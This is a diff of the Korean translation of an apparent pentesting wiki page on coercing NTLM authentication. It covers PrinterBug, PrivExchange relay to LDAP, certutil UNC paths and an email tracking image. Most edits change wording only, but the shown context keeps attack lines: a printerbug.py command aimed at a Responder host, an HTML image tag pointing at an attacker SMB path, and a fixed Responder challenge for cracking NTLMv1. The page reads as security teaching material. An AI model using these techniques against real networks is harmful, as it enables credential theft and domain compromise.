@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegation과 결합
 
-공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)으로 컴퓨터를 손상시킨 경우, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. 제약 없는 위임으로 인해 **프린터의 컴퓨터 계정의 TGT**가 **제약 없는 위임이 있는 컴퓨터의 메모리에 저장됩니다**. 공격자가 이미 이 호스트를 손상시켰기 때문에, 그는 **이 티켓을 검색하고 악용할 수 있습니다** ([Pass the Ticket](pass-the-ticket.md)).
+공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)으로 컴퓨터를 손상시킨 경우, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. 비제한 위임으로 인해 **프린터의 컴퓨터 계정의 TGT**가 **비제한 위임이 있는 컴퓨터의 메모리에 저장됩니다**. 공격자가 이미 이 호스트를 손상시켰기 때문에, 그는 **이 티켓을 검색하고 악용할 수 있습니다** ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP 강제 인증
 
@@ -53,7 +53,7 @@ https://github.com/p0dalirius/Coercer
 
 `PrivExchange` 공격은 **Exchange Server `PushSubscription` 기능**에서 발견된 결함의 결과입니다. 이 기능은 Exchange 서버가 메일박스가 있는 모든 도메인 사용자에 의해 HTTP를 통해 클라이언트 제공 호스트에 인증되도록 강제할 수 있게 합니다.
 
-기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다(특히, **2019년 누적 업데이트 이전 도메인에 대한 WriteDacl 권한이 있습니다**). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출할 수 있도록 악용될 수 있습니다**. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내의 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
+기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다 (특히, **2019년 누적 업데이트 이전 도메인에 대한 WriteDacl 권한이 있습니다**). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출할 수 있도록 악용될 수 있습니다**. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내의 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
 
 ## Windows 내부
 
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### 이메일을 통한
 
-당신이 침투하고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지가 포함된 이메일**을 보낼 수 있습니다.
+당신이 침해하고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지**가 포함된 **이메일**을 보낼 수 있습니다.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -105,6 +105,6 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## NTLMv1 크래킹
 
 [NTLMv1 챌린지를 캡처할 수 있다면 여기에서 크래킹하는 방법을 읽어보세요](../ntlm/index.html#ntlmv1-attack).\
-&#xNAN;_&#x52;emember NTLMv1을 크래킹하려면 Responder 챌린지를 "1122334455667788"로 설정해야 합니다._
+_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
